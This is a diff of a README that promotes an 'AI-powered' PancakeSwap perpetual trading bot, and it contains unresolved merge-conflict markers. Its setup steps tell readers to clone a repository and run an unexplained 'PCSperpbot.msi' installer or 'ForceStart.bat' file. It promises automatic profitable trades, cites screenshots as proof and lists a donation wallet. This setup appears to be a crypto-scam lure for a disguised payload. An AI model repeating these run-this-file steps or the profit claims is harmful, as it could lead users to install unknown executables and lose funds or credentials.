@@ -1,4 +1,4 @@
-# PancakeSwap Automated Perpatual Trading Bot - AI-powered Perpatual Profitable Trades
+# PancakeSwap Automated Perpetual Trading Bot - AI-powered Perpetual Profitable Trades
 
 
 ![Bot Auto Start Button](/share-position/AIBotButton.png?raw=true)
@@ -7,14 +7,14 @@
 
 ## Running the bot is very easy:
 
-Download the [repo.](https://github.com/PancakeswapPredictUltimateWinner/Pancakeswap-Perpatual-Trading-Bot/archive/refs/heads/main.zip)
+Download the [repo.](https://github.com/PredictBots/Pancakeswap-Perpatual-Trading-Bot/archive/refs/heads/main.zip)
 Run the **PCSperpbot.msi**
 Go to the Pancakeswap Perpetual Trading page.
 The auto start button will automatically appear as shown in the screenshot above.
 (If you get an error, you can run the bot by double-clicking the "ForceStart.bat" file.)
 
-+Open and Close Profitable Perpatual Trades Automatically on PancakeSwap
-+Our bot uses artificial intelligence technology to make powerful predictions for Perpetual trades on PancakeSwap and automatically opens and closes perpatual trades.
++Open and Close Profitable Perpetual Trades Automatically on PancakeSwap
++Our bot uses artificial intelligence technology to make powerful predictions for Perpetual trades on PancakeSwap and automatically opens and closes perpetual trades.
 
 ## 🐰⚡ Installation on CMD
 
@@ -24,7 +24,7 @@ Download and Install Git here:
 Then run the following commands in terminal or CMD:
 
 ```shell
-git clone https://github.com/PancakeswapPredictUltimateWinner/Pancakeswap-Perpatual-Trading-Bot
+git clone https://github.com/PredictBots/Pancakeswap-Perpatual-Trading-Bot
 cd Pancakeswap-Perpatual-Trading-Bot
 "PCSperpbot.msi"
 ```
@@ -32,7 +32,7 @@ cd Pancakeswap-Perpatual-Trading-Bot
 If you experience errors while the bot is running, you can apply the force start option below:
 
 ```shell
-git clone https://github.com/PancakeswapPredictUltimateWinner/Pancakeswap-Perpatual-Trading-Bot
+git clone https://github.com/PredictBots/Pancakeswap-Perpatual-Trading-Bot
 cd Pancakeswap-Perpatual-Trading-Bot
 "ForceStart.bat"
 ```
@@ -61,12 +61,16 @@ You can message us 24/7 on our Telegram address for any support and assistance.
 ## Benefits of the Bot:
 
 +Saves time
-+More full automatic profitable perpatual trades
++More full automatic profitable perpetual trades
 +Eliminates the risk of emotional decision-making
 +24/7 trade tracking
 
 ## PNL Screenshots:
+<<<<<<< HEAD
 You can verify the authenticity of PNL evidence by scanning qr codes.
+=======
+### You can confirm the authenticity of the transactions by scanning the QR code in the screenshots. These are evidence.
+>>>>>>> 92a20de7d1165e4e5af63355a58db07c9e6147f8
 
 ![PNL](/share-position/share-position-1710291048402.jpeg?raw=true)
 ![PNL](/share-position/share-position-1710291081330.jpeg?raw=true)
@@ -96,4 +100,7 @@ NEW PNLS ADDED:
 ## Thanks:
 
 Thank you for using our bot. If you have any questions or suggestions, please let us know.
+<<<<<<< HEAD
 If you find this bot helpful, feel free to donate on BSC ```0xAc45074eAb70eB5749b72115814dE42225e00800```
+=======
+>>>>>>> 92a20de7d1165e4e5af63355a58db07c9e6147f8
